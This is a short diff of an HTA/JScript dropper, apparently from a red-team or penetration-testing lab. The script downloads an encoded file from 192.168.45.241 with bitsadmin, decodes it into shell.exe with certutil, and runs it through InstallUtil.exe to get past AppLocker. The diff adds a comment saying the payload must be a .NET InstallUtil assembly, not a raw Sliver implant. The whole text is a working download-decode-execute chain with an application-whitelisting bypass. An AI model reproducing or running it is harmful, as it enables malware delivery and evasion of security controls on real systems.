@@ -7,7 +7,10 @@ try {
     shell.Run("bitsadmin /transfer myjob /download /priority FOREGROUND http://192.168.45.241/clm.txt C:\\Windows\\Tasks\\clm.txt", 0, true);
     // Decode the file
     shell.Run("powershell certutil -decode C:\\Windows\\Tasks\\clm.txt C:\\Windows\\Tasks\\shell.exe", 0, true);
-    // Run InstallUtil on the EXE
+    // Run InstallUtil on the EXE.
+    // NOTE: shell.exe must be a .NET InstallUtil payload (e.g. compile
+    //       word-macro/installutil-applocker-bypass/installutil.cs) — NOT a raw
+    //       Sliver/Go implant. InstallUtil.exe /U only loads .NET assemblies.
     shell.Run("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\shell.exe", 0, false);
     // Log success
     shell.Run("cmd.exe /c echo HTA executed with bitsadmin > C:\\hta_log.txt", 0, false);
